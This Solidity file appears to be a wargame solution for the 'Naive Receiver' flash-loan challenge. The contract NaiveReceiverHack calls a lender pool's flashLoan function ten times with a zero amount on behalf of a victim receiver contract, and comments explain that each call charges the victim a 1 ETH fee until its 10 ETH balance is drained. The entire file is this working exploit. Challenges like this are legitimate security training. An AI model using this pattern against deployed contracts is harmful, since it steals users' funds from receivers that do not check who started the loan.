// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool} from "../naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiverHack {
    // the user's receiver contract has 10 eth, so by calling the flash loan function with 
    // demanding 0 flash loan for receiver equal to user's receiver contract, we can make the user to pay 1 eth for every txn
    // as the user has 10 eth in contract, so we can call it 10 times to drain all the funds
    function attackUser(address vulnerableLenderPool, address receiverContractAddr, address token) external {
        NaiveReceiverLenderPool lenderPool = NaiveReceiverLenderPool(payable(vulnerableLenderPool));
        FlashLoanReceiver receiverContract = FlashLoanReceiver(payable(receiverContractAddr));


        // as it would take 10 iterations to drain all the 10 eth, as in one turn we drain 1 eth as fees to lender
        for (uint256 i = 0; i < 10; i++) {
            bool success = lenderPool.flashLoan(receiverContract, token, 0, "");
            if (!success) {
                revert();
            }
        }
    }
}